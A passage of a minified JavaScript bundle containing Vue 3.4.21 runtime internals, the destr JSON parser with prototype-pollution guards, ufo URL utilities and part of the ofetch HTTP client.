  return (n.staticCount = t), n;
}
function so(e = "", t = !1) {
  return t ? (ve(), Ft(Nt, null, e)) : Qe(Nt, null, e);
}
function Tt(e) {
  return null == e || "boolean" == typeof e
    ? Qe(Nt)
    : ye(e)
    ? Qe(ot, null, e.slice())
    : "object" == typeof e
    ? In(e)
    : Qe(Io, null, String(e));
}
function In(e) {
  return (null === e.el && -1 !== e.patchFlag) || e.memo ? e : Ro(e);
}
function Ha(e, t) {
  let n = 0;
  const { shapeFlag: o } = e;
  if (null == t) t = null;
  else if (ye(t)) n = 16;
  else if ("object" == typeof t) {
    if (65 & o) {
      const i = t.default;
      return void (i && (i._c && (i._d = !1), Ha(e, i()), i._c && (i._d = !0)));
    }
    {
      n = 32;
      const i = t._;
      i || Wr in t
        ? 3 === i &&
          Ke &&
          (1 === Ke.slots._ ? (t._ = 1) : ((t._ = 2), (e.patchFlag |= 1024)))
        : (t._ctx = Ke);
    }
  } else
    Ae(t)
      ? ((t = { default: t, _ctx: Ke }), (n = 32))
      : ((t = String(t)), 64 & o ? ((n = 16), (t = [mi(t)])) : (n = 8));
  (e.children = t), (e.shapeFlag |= n);
}
function hm(...e) {
  const t = {};
  for (let n = 0; n < e.length; n++) {
    const o = e[n];
    for (const i in o)
      if ("class" === i)
        t.class !== o.class && (t.class = gt([t.class, o.class]));
      else if ("style" === i) t.style = Pt([t.style, o.style]);
      else if (pi(i)) {
        const a = t[i],
          u = o[i];
        u &&
          a !== u &&
          (!ye(a) || !a.includes(u)) &&
          (t[i] = a ? [].concat(a, u) : u);
      } else "" !== i && (t[i] = o[i]);
  }
  return t;
}
function St(e, t, n, o = null) {
  jt(e, t, 7, [n, o]);
}
const pm = nd();
let gm = 0;
function mm(e, t, n) {
  const o = e.type,
    i = (t ? t.appContext : e.appContext) || pm,
    a = {
      uid: gm++,
      vnode: e,
      type: o,
      parent: t,
      appContext: i,
      root: null,
      next: null,
      subTree: null,
      effect: null,
      update: null,
      scope: new Au(!0),
      render: null,
      proxy: null,
      exposed: null,
      exposeProxy: null,
      withProxy: null,
      provides: t ? t.provides : Object.create(i.provides),
      accessCache: null,
      renderCache: [],
      components: null,
      directives: null,
      propsOptions: rd(o, i),
      emitsOptions: Yu(o, i),
      emit: null,
      emitted: null,
      propsDefaults: Je,
      inheritAttrs: o.inheritAttrs,
      ctx: Je,
      data: Je,
      props: Je,
      attrs: Je,
      slots: Je,
      refs: Je,
      setupState: Je,
      setupContext: null,
      attrsProxy: null,
      slotsProxy: null,
      suspense: n,
      suspenseId: n ? n.pendingId : 0,
      asyncDep: null,
      asyncResolved: !1,
      isMounted: !1,
      isUnmounted: !1,
      isDeactivated: !1,
      bc: null,
      c: null,
      bm: null,
      m: null,
      bu: null,
      u: null,
      um: null,
      bum: null,
      da: null,
      a: null,
      rtg: null,
      rtc: null,
      ec: null,
      sp: null,
    };
  return (
    (a.ctx = { _: a }),
    (a.root = t ? t.root : a),
    (a.emit = Ag.bind(null, a)),
    e.ce && e.ce(a),
    a
  );
}
let tt = null;
const vm = () => tt || Ke;
let fr, na;
{
  const e = vu(),
    t = (n, o) => {
      let i;
      return (
        (i = e[n]) || (i = e[n] = []),
        i.push(o),
        (a) => {
          i.length > 1 ? i.forEach((u) => u(a)) : i[0](a);
        }
      );
    };
  (fr = t("__VUE_INSTANCE_SETTERS__", (n) => (tt = n))),
    (na = t("__VUE_SSR_SETTERS__", (n) => (yi = n)));
}
const vi = (e) => {
    const t = tt;
    return (
      fr(e),
      e.scope.on(),
      () => {
        e.scope.off(), fr(t);
      }
    );
  },
  Tc = () => {
    tt && tt.scope.off(), fr(null);
  };
function vd(e) {
  return 4 & e.vnode.shapeFlag;
}
let kc,
  yi = !1;
function ym(e, t = !1) {
  t && na(t);
  const { props: n, children: o } = e.vnode,
    i = vd(e);
  em(e, n, i, t), om(e, o);
  const a = i ? wm(e, t) : void 0;
  return t && na(!1), a;
}
function wm(e, t) {
  const n = e.type;
  (e.accessCache = Object.create(null)), (e.proxy = Er(new Proxy(e.ctx, Hg)));
  const { setup: o } = n;
  if (o) {
    const i = (e.setupContext = o.length > 1 ? bm(e) : null),
      a = vi(e);
    ao();
    const u = Ln(o, e, 0, [e.props, i]);
    if ((lo(), a(), pu(u))) {
      if ((u.then(Tc, Tc), t))
        return u
          .then((f) => {
            oa(e, f, t);
          })
          .catch((f) => {
            Go(f, e, 0);
          });
      e.asyncDep = u;
    } else oa(e, u, t);
  } else yd(e, t);
}
function oa(e, t, n) {
  Ae(t)
    ? e.type.__ssrInlineRender
      ? (e.ssrRender = t)
      : (e.render = t)
    : ze(t) && (e.setupState = ju(t)),
    yd(e, n);
}
function yd(e, t, n) {
  const o = e.type;
  if (!e.render) {
    if (!t && kc && !o.render) {
      const i = o.template || za(e).template;
      if (i) {
        const { isCustomElement: a, compilerOptions: u } = e.appContext.config,
          { delimiters: f, compilerOptions: p } = o,
          v = rt(rt({ isCustomElement: a, delimiters: f }, u), p);
        o.render = kc(i, v);
      }
    }
    e.render = o.render || Et;
  }
  {
    const i = vi(e);
    ao();
    try {
      Vg(e);
    } finally {
      lo(), i();
    }
  }
}
function Am(e) {
  return (
    e.attrsProxy ||
    (e.attrsProxy = new Proxy(e.attrs, {
      get: (t, n) => (mt(e, "get", "$attrs"), t[n]),
    }))
  );
}
function bm(e) {
  return {
    get attrs() {
      return Am(e);
    },
    slots: e.slots,
    emit: e.emit,
    expose: (n) => {
      e.exposed = n || {};
    },
  };
}
function Gr(e) {
  if (e.exposed)
    return (
      e.exposeProxy ||
      (e.exposeProxy = new Proxy(ju(Er(e.exposed)), {
        get: (t, n) => (n in t ? t[n] : n in $o ? $o[n](e) : void 0),
        has: (t, n) => n in t || n in $o,
      }))
    );
}
function _m(e, t = !0) {
  return Ae(e) ? e.displayName || e.name : e.name || (t && e.__name);
}
function xm(e) {
  return Ae(e) && "__vccOpts" in e;
}
const co = (e, t) => cg(e, t, yi);
function Pm(e, t, n) {
  const o = arguments.length;
  return 2 === o
    ? ze(t) && !ye(t)
      ? ci(t)
        ? Qe(e, null, [t])
        : Qe(e, t)
      : Qe(e, null, t)
    : (o > 3
        ? (n = Array.prototype.slice.call(arguments, 2))
        : 3 === o && ci(n) && (n = [n]),
      Qe(e, t, n));
}
const wd = "3.4.21",
  Mm = "http://www.w3.org/2000/svg",
  Sm = "http://www.w3.org/1998/Math/MathML",
  On = typeof document < "u" ? document : null,
  Ec = On && On.createElement("template"),
  Tm = {
    insert: (e, t, n) => {
      t.insertBefore(e, n || null);
    },
    remove: (e) => {
      const t = e.parentNode;
      t && t.removeChild(e);
    },
    createElement: (e, t, n, o) => {
      const i =
        "svg" === t
          ? On.createElementNS(Mm, e)
          : "mathml" === t
          ? On.createElementNS(Sm, e)
          : On.createElement(e, n ? { is: n } : void 0);
      return (
        "select" === e &&
          o &&
          null != o.multiple &&
          i.setAttribute("multiple", o.multiple),
        i
      );
    },
    createText: (e) => On.createTextNode(e),
    createComment: (e) => On.createComment(e),
    setText: (e, t) => {
      e.nodeValue = t;
    },
    setElementText: (e, t) => {
      e.textContent = t;
    },
    parentNode: (e) => e.parentNode,
    nextSibling: (e) => e.nextSibling,
    querySelector: (e) => On.querySelector(e),
    setScopeId(e, t) {
      e.setAttribute(t, "");
    },
    insertStaticContent(e, t, n, o, i, a) {
      const u = n ? n.previousSibling : t.lastChild;
      if (i && (i === a || i.nextSibling))
        for (
          ;
          t.insertBefore(i.cloneNode(!0), n), i !== a && (i = i.nextSibling);

        );
      else {
        Ec.innerHTML =
          "svg" === o
            ? `<svg>${e}</svg>`
            : "mathml" === o
            ? `<math>${e}</math>`
            : e;
        const f = Ec.content;
        if ("svg" === o || "mathml" === o) {
          const p = f.firstChild;
          for (; p.firstChild; ) f.appendChild(p.firstChild);
          f.removeChild(p);
        }
        t.insertBefore(f, n);
      }
      return [
        u ? u.nextSibling : t.firstChild,
        n ? n.previousSibling : t.lastChild,
      ];
    },
  },
  km = Symbol("_vtc");
function Em(e, t, n) {
  const o = e[km];
  o && (t = (t ? [t, ...o] : [...o]).join(" ")),
    null == t
      ? e.removeAttribute("class")
      : n
      ? e.setAttribute("class", t)
      : (e.className = t);
}
const Dc = Symbol("_vod"),
  Dm = Symbol("_vsh"),
  Im = Symbol(""),
  Om = /(^|;)\s*display\s*:/;
function Rm(e, t, n) {
  const o = e.style,
    i = Ze(n);
  let a = !1;
  if (n && !i) {
    if (t)
      if (Ze(t))
        for (const u of t.split(";")) {
          const f = u.slice(0, u.indexOf(":")).trim();
          null == n[f] && Ki(o, f, "");
        }
      else for (const u in t) null == n[u] && Ki(o, u, "");
    for (const u in n) "display" === u && (a = !0), Ki(o, u, n[u]);
  } else if (i) {
    if (t !== n) {
      const u = o[Im];
      u && (n += ";" + u), (o.cssText = n), (a = Om.test(n));
    }
  } else t && e.removeAttribute("style");
  Dc in e && ((e[Dc] = a ? o.display : ""), e[Dm] && (o.display = "none"));
}
const Ic = /\s*!important$/;
function Ki(e, t, n) {
  if (ye(n)) n.forEach((o) => Ki(e, t, o));
  else if ((null == n && (n = ""), t.startsWith("--"))) e.setProperty(t, n);
  else {
    const o = Cm(e, t);
    Ic.test(n)
      ? e.setProperty(Wo(o), n.replace(Ic, ""), "important")
      : (e[o] = n);
  }
}
const Oc = ["Webkit", "Moz", "ms"],
  Os = {};
function Cm(e, t) {
  const n = Os[t];
  if (n) return n;
  let o = Qt(t);
  if ("filter" !== o && o in e) return (Os[t] = o);
  o = Tr(o);
  for (let i = 0; i < Oc.length; i++) {
    const a = Oc[i] + o;
    if (a in e) return (Os[t] = a);
  }
  return t;
}
const Rc = "http://www.w3.org/1999/xlink";
function Wm(e, t, n, o, i) {
  if (o && t.startsWith("xlink:"))
    null == n
      ? e.removeAttributeNS(Rc, t.slice(6, t.length))
      : e.setAttributeNS(Rc, t, n);
  else {
    const a = Np(t);
    null == n || (a && !yu(n))
      ? e.removeAttribute(t)
      : e.setAttribute(t, a ? "" : n);
  }
}
function Gm(e, t, n, o, i, a, u) {
  if ("innerHTML" === t || "textContent" === t)
    return o && u(o, i, a), void (e[t] = n ?? "");
  const f = e.tagName;
  if ("value" === t && "PROGRESS" !== f && !f.includes("-")) {
    const y = n ?? "";
    return (
      (("OPTION" === f ? e.getAttribute("value") || "" : e.value) !== y ||
        !("_value" in e)) &&
        (e.value = y),
      null == n && e.removeAttribute(t),
      void (e._value = n)
    );
  }
  let p = !1;
  if ("" === n || null == n) {
    const v = typeof e[t];
    "boolean" === v
      ? (n = yu(n))
      : null == n && "string" === v
      ? ((n = ""), (p = !0))
      : "number" === v && ((n = 0), (p = !0));
  }
  try {
    e[t] = n;
  } catch {}
  p && e.removeAttribute(t);
}
function yo(e, t, n, o) {
  e.addEventListener(t, n, o);
}
function Fm(e, t, n, o) {
  e.removeEventListener(t, n, o);
}
const Cc = Symbol("_vei");
function Lm(e, t, n, o, i = null) {
  const a = e[Cc] || (e[Cc] = {}),
    u = a[t];
  if (o && u) u.value = o;
  else {
    const [f, p] = jm(t);
    if (o) {
      yo(e, f, (a[t] = Jm(o, i)), p);
    } else u && (Fm(e, f, u, p), (a[t] = void 0));
  }
}
const Wc = /(?:Once|Passive|Capture)$/;
function jm(e) {
  let t;
  if (Wc.test(e)) {
    let o;
    for (t = {}; (o = e.match(Wc)); )
      (e = e.slice(0, e.length - o[0].length)), (t[o[0].toLowerCase()] = !0);
  }
  return [":" === e[2] ? e.slice(3) : Wo(e.slice(2)), t];
}
let Rs = 0;
const Nm = Promise.resolve(),
  Bm = () => Rs || (Nm.then(() => (Rs = 0)), (Rs = Date.now()));
function Jm(e, t) {
  const n = (o) => {
    if (o._vts) {
      if (o._vts <= n.attached) return;
    } else o._vts = Date.now();
    jt(zm(o, n.value), t, 5, [o]);
  };
  return (n.value = e), (n.attached = Bm()), n;
}
function zm(e, t) {
  if (ye(t)) {
    const n = e.stopImmediatePropagation;
    return (
      (e.stopImmediatePropagation = () => {
        n.call(e), (e._stopped = !0);
      }),
      t.map((o) => (i) => !i._stopped && o && o(i))
    );
  }
  return t;
}
const Gc = (e) =>
    111 === e.charCodeAt(0) &&
    110 === e.charCodeAt(1) &&
    e.charCodeAt(2) > 96 &&
    e.charCodeAt(2) < 123,
  Ym = (e, t, n, o, i, a, u, f, p) => {
    const v = "svg" === i;
    "class" === t
      ? Em(e, o, v)
      : "style" === t
      ? Rm(e, n, o)
      : pi(t)
      ? Ma(t) || Lm(e, t, n, o, u)
      : (
          "." === t[0]
            ? ((t = t.slice(1)), 1)
            : "^" === t[0]
            ? ((t = t.slice(1)), 0)
            : Um(e, t, o, v)
        )
      ? Gm(e, t, o, a, u, f, p)
      : ("true-value" === t
          ? (e._trueValue = o)
          : "false-value" === t && (e._falseValue = o),
        Wm(e, t, o, v));
  };
function Um(e, t, n, o) {
  if (o)
    return !!(
      "innerHTML" === t ||
      "textContent" === t ||
      (t in e && Gc(t) && Ae(n))
    );
  if (
    "spellcheck" === t ||
    "draggable" === t ||
    "translate" === t ||
    "form" === t ||
    ("list" === t && "INPUT" === e.tagName) ||
    ("type" === t && "TEXTAREA" === e.tagName)
  )
    return !1;
  if ("width" === t || "height" === t) {
    const i = e.tagName;
    if ("IMG" === i || "VIDEO" === i || "CANVAS" === i || "SOURCE" === i)
      return !1;
  }
  return (!Gc(t) || !Ze(n)) && t in e;
}
const Fc = (e) => {
  const t = e.props["onUpdate:modelValue"] || !1;
  return ye(t) ? (n) => Qi(t, n) : t;
};
function Hm(e) {
  e.target.composing = !0;
}
function Lc(e) {
  const t = e.target;
  t.composing && ((t.composing = !1), t.dispatchEvent(new Event("input")));
}
const Cs = Symbol("_assign"),
  Ws = {
    created(e, { modifiers: { lazy: t, trim: n, number: o } }, i) {
      e[Cs] = Fc(i);
      const a = o || (i.props && "number" === i.props.type);
      yo(e, t ? "change" : "input", (u) => {
        if (u.target.composing) return;
        let f = e.value;
        n && (f = f.trim()), a && (f = Ys(f)), e[Cs](f);
      }),
        n &&
          yo(e, "change", () => {
            e.value = e.value.trim();
          }),
        t ||
          (yo(e, "compositionstart", Hm),
          yo(e, "compositionend", Lc),
          yo(e, "change", Lc));
    },
    mounted(e, { value: t }) {
      e.value = t ?? "";
    },
    beforeUpdate(
      e,
      { value: t, modifiers: { lazy: n, trim: o, number: i } },
      a
    ) {
      if (((e[Cs] = Fc(a)), e.composing)) return;
      const f = t ?? "";
      (i || "number" === e.type ? Ys(e.value) : e.value) !== f &&
        ((document.activeElement === e &&
          "range" !== e.type &&
          (n || (o && e.value.trim() === f))) ||
          (e.value = f));
    },
  },
  Vm = ["ctrl", "shift", "alt", "meta"],
  Qm = {
    stop: (e) => e.stopPropagation(),
    prevent: (e) => e.preventDefault(),
    self: (e) => e.target !== e.currentTarget,
    ctrl: (e) => !e.ctrlKey,
    shift: (e) => !e.shiftKey,
    alt: (e) => !e.altKey,
    meta: (e) => !e.metaKey,
    left: (e) => "button" in e && 0 !== e.button,
    middle: (e) => "button" in e && 1 !== e.button,
    right: (e) => "button" in e && 2 !== e.button,
    exact: (e, t) => Vm.some((n) => e[`${n}Key`] && !t.includes(n)),
  },
  Xm = (e, t) => {
    const n = e._withMods || (e._withMods = {}),
      o = t.join(".");
    return (
      n[o] ||
      (n[o] = (i, ...a) => {
        for (let u = 0; u < t.length; u++) {
          const f = Qm[t[u]];
          if (f && f(i, t)) return;
        }
        return e(i, ...a);
      })
    );
  },
  Ad = rt({ patchProp: Ym }, Tm);
let ni,
  jc = !1;
function Zm() {
  return ni || (ni = lm(Ad));
}
function qm() {
  return (ni = jc ? ni : cm(Ad)), (jc = !0), ni;
}
const Km = (...e) => {
    const t = Zm().createApp(...e),
      { mount: n } = t;
    return (
      (t.mount = (o) => {
        const i = _d(o);
        if (!i) return;
        const a = t._component;
        !Ae(a) && !a.render && !a.template && (a.template = i.innerHTML),
          (i.innerHTML = "");
        const u = n(i, !1, bd(i));
        return (
          i instanceof Element &&
            (i.removeAttribute("v-cloak"), i.setAttribute("data-v-app", "")),
          u
        );
      }),
      t
    );
  },
  $m = (...e) => {
    const t = qm().createApp(...e),
      { mount: n } = t;
    return (
      (t.mount = (o) => {
        const i = _d(o);
        if (i) return n(i, !0, bd(i));
      }),
      t
    );
  };
function bd(e) {
  return e instanceof SVGElement
    ? "svg"
    : "function" == typeof MathMLElement && e instanceof MathMLElement
    ? "mathml"
    : void 0;
}
function _d(e) {
  return Ze(e) ? document.querySelector(e) : e;
}
const ev =
    /"(?:_|\\u0{2}5[Ff]){2}(?:p|\\u0{2}70)(?:r|\\u0{2}72)(?:o|\\u0{2}6[Ff])(?:t|\\u0{2}74)(?:o|\\u0{2}6[Ff])(?:_|\\u0{2}5[Ff]){2}"\s*:/,
  tv =
    /"(?:c|\\u0063)(?:o|\\u006[Ff])(?:n|\\u006[Ee])(?:s|\\u0073)(?:t|\\u0074)(?:r|\\u0072)(?:u|\\u0075)(?:c|\\u0063)(?:t|\\u0074)(?:o|\\u006[Ff])(?:r|\\u0072)"\s*:/,
  nv = /^\s*["[{]|^\s*-?\d{1,16}(\.\d{1,17})?([Ee][+-]?\d+)?\s*$/;
function ov(e, t) {
  if (
    !(
      "__proto__" === e ||
      ("constructor" === e && t && "object" == typeof t && "prototype" in t)
    )
  )
    return t;
  iv(e);
}
function iv(e) {
  console.warn(`[destr] Dropping "${e}" key to prevent prototype pollution.`);
}
function hr(e, t = {}) {
  if ("string" != typeof e) return e;
  const n = e.trim();
  if ('"' === e[0] && e.endsWith('"') && !e.includes("\\"))
    return n.slice(1, -1);
  if (n.length <= 9) {
    const o = n.toLowerCase();
    if ("true" === o) return !0;
    if ("false" === o) return !1;
    if ("undefined" === o) return;
    if ("null" === o) return null;
    if ("nan" === o) return Number.NaN;
    if ("infinity" === o) return Number.POSITIVE_INFINITY;
    if ("-infinity" === o) return Number.NEGATIVE_INFINITY;
  }
  if (!nv.test(e)) {
    if (t.strict) throw new SyntaxError("[destr] Invalid JSON");
    return e;
  }
  try {
    if (ev.test(e) || tv.test(e)) {
      if (t.strict) throw new Error("[destr] Possible prototype pollution");
      return JSON.parse(e, ov);
    }
    return JSON.parse(e);
  } catch (o) {
    if (t.strict) throw o;
    return e;
  }
}
const rv = /#/g,
  sv = /&/g,
  av = /\//g,
  lv = /=/g,
  Va = /\+/g,
  cv = /%5e/gi,
  uv = /%60/gi,
  dv = /%7c/gi,
  fv = /%20/gi;
function hv(e) {
  return encodeURI("" + e).replace(dv, "|");
}
function ia(e) {
  return hv("string" == typeof e ? e : JSON.stringify(e))
    .replace(Va, "%2B")
    .replace(fv, "+")
    .replace(rv, "%23")
    .replace(sv, "%26")
    .replace(uv, "`")
    .replace(cv, "^")
    .replace(av, "%2F");
}
function Gs(e) {
  return ia(e).replace(lv, "%3D");
}
function pr(e = "") {
  try {
    return decodeURIComponent("" + e);
  } catch {
    return "" + e;
  }
}
function pv(e) {
  return pr(e.replace(Va, " "));
}
function gv(e) {
  return pr(e.replace(Va, " "));
}
function xd(e = "") {
  const t = {};
  "?" === e[0] && (e = e.slice(1));
  for (const n of e.split("&")) {
    const o = n.match(/([^=]+)=?(.*)/) || [];
    if (o.length < 2) continue;
    const i = pv(o[1]);
    if ("__proto__" === i || "constructor" === i) continue;
    const a = gv(o[2] || "");
    void 0 === t[i]
      ? (t[i] = a)
      : Array.isArray(t[i])
      ? t[i].push(a)
      : (t[i] = [t[i], a]);
  }
  return t;
}
function mv(e, t) {
  return (
    ("number" == typeof t || "boolean" == typeof t) && (t = String(t)),
    t
      ? Array.isArray(t)
        ? t.map((n) => `${Gs(e)}=${ia(n)}`).join("&")
        : `${Gs(e)}=${ia(t)}`
      : Gs(e)
  );
}
function Pd(e) {
  return Object.keys(e)
    .filter((t) => void 0 !== e[t])
    .map((t) => mv(t, e[t]))
    .filter(Boolean)
    .join("&");
}
const vv = /^[\s\w\0+.-]{2,}:([/\\]{1,2})/,
  yv = /^[\s\w\0+.-]{2,}:([/\\]{2})?/,
  wv = /^([/\\]\s*){2,}[^/\\]/,
  Av = /^[\s\0]*(blob|data|javascript|vbscript):$/i,
  bv = /\/$|\/\?|\/#/,
  _v = /^\.?\//;
function Fo(e, t = {}) {
  return (
    "boolean" == typeof t && (t = { acceptRelative: t }),
    t.strict ? vv.test(e) : yv.test(e) || (!!t.acceptRelative && wv.test(e))
  );
}
function xv(e) {
  return !!e && Av.test(e);
}
function ra(e = "", t) {
  return t ? bv.test(e) : e.endsWith("/");
}
function Qa(e = "", t) {
  if (!t) return (ra(e) ? e.slice(0, -1) : e) || "/";
  if (!ra(e, !0)) return e || "/";
  let n = e,
    o = "";
  const i = e.indexOf("#");
  i >= 0 && ((n = e.slice(0, i)), (o = e.slice(i)));
  const [a, ...u] = n.split("?");
  return (
    ((a.endsWith("/") ? a.slice(0, -1) : a) || "/") +
    (u.length > 0 ? `?${u.join("?")}` : "") +
    o
  );
}
function sa(e = "", t) {
  if (!t) return e.endsWith("/") ? e : e + "/";
  if (ra(e, !0)) return e || "/";
  let n = e,
    o = "";
  const i = e.indexOf("#");
  if (i >= 0 && ((n = e.slice(0, i)), (o = e.slice(i)), !n)) return o;
  const [a, ...u] = n.split("?");
  return a + "/" + (u.length > 0 ? `?${u.join("?")}` : "") + o;
}
function Pv(e = "") {
  return e.startsWith("/");
}
function Nc(e = "") {
  return Pv(e) ? e : "/" + e;
}
function Mv(e, t) {
  if (Sd(t) || Fo(e)) return e;
  const n = Qa(t);
  return e.startsWith(n) ? e : Fr(n, e);
}
function Sv(e, t) {
  if (Sd(t)) return e;
  const n = Qa(t);
  if (!e.startsWith(n)) return e;
  const o = e.slice(n.length);
  return "/" === o[0] ? o : "/" + o;
}
function Md(e, t) {
  const n = wi(e),
    o = { ...xd(n.search), ...t };
  return (n.search = Pd(o)), Ed(n);
}
function Sd(e) {
  return !e || "/" === e;
}
function Tv(e) {
  return e && "/" !== e;
}
function Fr(e, ...t) {
  let n = e || "";
  for (const o of t.filter((i) => Tv(i)))
    if (n) {
      const i = o.replace(_v, "");
      n = sa(n) + i;
    } else n = o;
  return n;
}
function Td(...e) {
  var u, f, p, v;
  const t = /\/(?!\/)/,
    n = e.filter(Boolean),
    o = [];
  let i = 0;
  for (const y of n)
    if (y && "/" !== y)
      for (const [w, x] of y.split(t).entries())
        if (x && "." !== x) {
          if (".." === x) {
            if (1 === o.length && Fo(o[0])) continue;
            o.pop(), i--;
            continue;
          }
          if (1 === w && null != (u = o[o.length - 1]) && u.endsWith(":/")) {
            o[o.length - 1] += "/" + x;
            continue;
          }
          o.push(x), i++;
        }
  let a = o.join("/");
  return (
    i >= 0
      ? null != (f = n[0]) && f.startsWith("/") && !a.startsWith("/")
        ? (a = "/" + a)
        : null != (p = n[0]) &&
          p.startsWith("./") &&
          !a.startsWith("./") &&
          (a = "./" + a)
      : (a = "../".repeat(-1 * i) + a),
    null != (v = n[n.length - 1]) &&
      v.endsWith("/") &&
      !a.endsWith("/") &&
      (a += "/"),
    a
  );
}
function kv(e, t, n = {}) {
  return (
    n.trailingSlash || ((e = sa(e)), (t = sa(t))),
    n.leadingSlash || ((e = Nc(e)), (t = Nc(t))),
    n.encoding || ((e = pr(e)), (t = pr(t))),
    e === t
  );
}
const kd = Symbol.for("ufo:protocolRelative");
function wi(e = "", t) {
  const n = e.match(/^[\s\0]*(blob:|data:|javascript:|vbscript:)(.*)/i);
  if (n) {
    const [, w, x = ""] = n;
    return {
      protocol: w.toLowerCase(),
      pathname: x,
      href: w + x,
      auth: "",
      host: "",
      search: "",
      hash: "",
    };
  }
  if (!Fo(e, { acceptRelative: !0 })) return t ? wi(t + e) : Bc(e);
  const [, o = "", i, a = ""] =
      e
        .replace(/\\/g, "/")
        .match(/^[\s\0]*([\w+.-]{2,}:)?\/\/([^/@]+@)?(.*)/) || [],
    [, u = "", f = ""] = a.match(/([^#/?]*)(.*)?/) || [],
    { pathname: p, search: v, hash: y } = Bc(f.replace(/\/(?=[A-Za-z]:)/, ""));
  return {
    protocol: o.toLowerCase(),
    auth: i ? i.slice(0, Math.max(0, i.length - 1)) : "",
    host: u,
    pathname: p,
    search: v,
    hash: y,
    [kd]: !o,
  };
}
function Bc(e = "") {
  const [t = "", n = "", o = ""] = (
    e.match(/([^#?]*)(\?[^#]*)?(#.*)?/) || []
  ).splice(1);
  return { pathname: t, search: n, hash: o };
}
function Ed(e) {
  const t = e.pathname || "",
    n = e.search ? (e.search.startsWith("?") ? "" : "?") + e.search : "",
    o = e.hash || "",
    i = e.auth ? e.auth + "@" : "",
    a = e.host || "";
  return (
    (e.protocol || e[kd] ? (e.protocol || "") + "//" : "") + i + a + t + n + o
  );
}
class Ev extends Error {
  constructor(t, n) {
    super(t, n),
      (this.name = "FetchError"),
      null != n && n.cause && !this.cause && (this.cause = n.cause);
  }
}
function Dv(e) {
  var p, v, y, w, x;
  const t =
      (null == (p = e.error) ? void 0 : p.message) ||
      (null == (v = e.error) ? void 0 : v.toString()) ||
      "",
    n =
      (null == (y = e.request) ? void 0 : y.method) ||
      (null == (w = e.options) ? void 0 : w.method) ||
      "GET",
    o = (null == (x = e.request) ? void 0 : x.url) || String(e.request) || "/",
    i = `[${n}] ${JSON.stringify(o)}`,
    a = e.response
      ? `${e.response.status} ${e.response.statusText}`
      : "<no response>",
    f = new Ev(
      `${i}: ${a}${t ? ` ${t}` : ""}`,
      e.error ? { cause: e.error } : void 0
    );
  for (const k of ["request", "options", "response"])
    Object.defineProperty(f, k, { get: () => e[k] });
  for (const [k, D] of [
    ["data", "_data"],
    ["status", "status"],
    ["statusCode", "status"],
    ["statusText", "statusText"],
    ["statusMessage", "statusText"],
  ])
    Object.defineProperty(f, k, { get: () => e.response && e.response[D] });
  return f;
}
const Iv = new Set(Object.freeze(["PATCH", "POST", "PUT", "DELETE"]));
function Jc(e = "GET") {
  return Iv.has(e.toUpperCase());
}
function Ov(e) {
  if (void 0 === e) return !1;
  const t = typeof e;
  return (
    "string" === t ||
    "number" === t ||
    "boolean" === t ||
    null === t ||
    ("object" === t &&
      (!!Array.isArray(e) ||
        (!e.buffer &&
          ((e.constructor && "Object" === e.constructor.name) ||
            "function" == typeof e.toJSON))))
  );
}
const Rv = new Set([
    "image/svg",
    "application/xml",
    "application/xhtml",
    "application/html",
  ]),
  Cv = /^application\/(?:[\w!#$%&*.^`~-]*\+)?json(;.+)?$/i;
function Wv(e = "") {
  if (!e) return "json";
  const t = e.split(";").shift() || "";
  return Cv.test(t)
    ? "json"
    : Rv.has(t) || t.startsWith("text/")
    ? "text"
    : "blob";
}
function Gv(e, t, n = globalThis.Headers) {
  const o = { ...t, ...e };
  if (
    (null != t &&
      t.params &&
      null != e &&
      e.params &&
      (o.params = {
        ...(null == t ? void 0 : t.params),
        ...(null == e ? void 0 : e.params),
      }),
    null != t &&
      t.query &&
      null != e &&
      e.query &&
      (o.query = {
        ...(null == t ? void 0 : t.query),
        ...(null == e ? void 0 : e.query),
      }),
    null != t && t.headers && null != e && e.headers)
  ) {
    o.headers = new n((null == t ? void 0 : t.headers) || {});
    for (const [i, a] of new n((null == e ? void 0 : e.headers) || {}))
      o.headers.set(i, a);
  }
  return o;
}
const Fv = new Set([408, 409, 425, 429, 500, 502, 503, 504]),
  Lv = new Set([101, 204, 205, 304]);
function Dd(e = {}) {
  const {
    fetch: t = globalThis.fetch,
    Headers: n = globalThis.Headers,
    AbortController: o = globalThis.AbortController,
  } = e;
  async function i(f) {
    const p =
      (f.error && "AbortError" === f.error.name && !f.options.timeout) || !1;
    if (!1 !== f.options.retry && !p) {
      let y;
      y =
        "number" == typeof f.options.retry
          ? f.options.retry
          : Jc(f.options.method)
          ? 0
          : 1;
      const w = (f.response && f.response.status) || 500;
      if (
        y > 0 &&
        (Array.isArray(f.options.retryStatusCodes)
          ? f.options.retryStatusCodes.includes(w)
          : Fv.has(w))
      ) {
        const x = f.options.retryDelay || 0;
        return (
          x > 0 && (await new Promise((k) => setTimeout(k, x))),
          a(f.request, { ...f.options, retry: y - 1 })
        );
      }
    }
    const v = Dv(f);
    throw (Error.captureStackTrace && Error.captureStackTrace(v, a), v);
  }
  const a = async function (p, v = {}) {
      var k;
      const y = {
        request: p,
        options: Gv(v, e.defaults, n),
        response: void 0,
        error: void 0,
      };
      let w;
      if (
        ((y.options.method =
          null == (k = y.options.method) ? void 0 : k.toUpperCase()),
        y.options.onRequest && (await y.options.onRequest(y)),
        "string" == typeof y.request &&
          (y.options.baseURL && (y.request = Mv(y.request, y.options.baseURL)),
          (y.options.query || y.options.params) &&
            (y.request = Md(y.request, {
              ...y.options.params,
              ...y.options.query,
            }))),
        y.options.body &&
          Jc(y.options.method) &&
          (Ov(y.options.body)
            ? ((y.options.body =
                "string" == typeof y.options.body
                  ? y.options.body
                  : JSON.stringify(y.options.body)),
              (y.options.headers = new n(y.options.headers || {})),
              y.options.headers.has("content-type") ||
                y.options.headers.set("content-type", "application/json"),
              y.options.headers.has("accept") ||
                y.options.headers.set("accept", "application/json"))
            : (("pipeTo" in y.options.body &&
                "function" == typeof y.options.body.pipeTo) ||
                "function" == typeof y.options.body.pipe) &&
              ("duplex" in y.options || (y.options.duplex = "half"))),
        !y.options.signal && y.options.timeout)
      ) {
        const D = new o();
        (w = setTimeout(() => D.abort(), y.options.timeout)),
          (y.options.signal = D.signal);
      }
      try {
        y.response = await t(y.request, y.options);
      } catch (D) {
        return (
          (y.error = D),
          y.options.onRequestError && (await y.options.onRequestError(y)),
          await i(y)
        );
      } finally {
        w && clearTimeout(w);
      }
      if (
        y.response.body &&
        !Lv.has(y.response.status) &&
        "HEAD" !== y.options.method
      ) {
        const D =
          (y.options.parseResponse ? "json" : y.options.responseType) ||
          Wv(y.response.headers.get("content-type") || "");
        switch (D) {
